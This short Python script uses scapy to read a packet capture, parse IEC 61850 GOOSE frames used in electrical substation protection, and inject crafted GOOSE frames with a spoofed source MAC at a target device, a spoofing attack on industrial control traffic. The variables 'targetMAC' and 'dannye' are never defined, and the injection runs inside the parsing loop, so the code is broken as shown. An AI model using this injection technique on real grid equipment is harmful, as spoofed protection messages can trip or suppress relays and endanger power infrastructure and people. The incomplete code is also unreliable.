from scapy.all import *
import goose

a = rdpcap("wireshark2.pcap")
for i in a:
    try:
        if i.type == 0x88B8:
            g = goose.GOOSE(i.load)
            # print repr(g.load)
            gpdu = goose.GOOSEPDU(g.load[4:])
            print(gpdu.__dict__)
            sendp((Ether(dst=targetMAC, src='06:06:06:06:06:06', type=0x88b8)/dannye, verbose=False)
    except AttributeError:
        continue
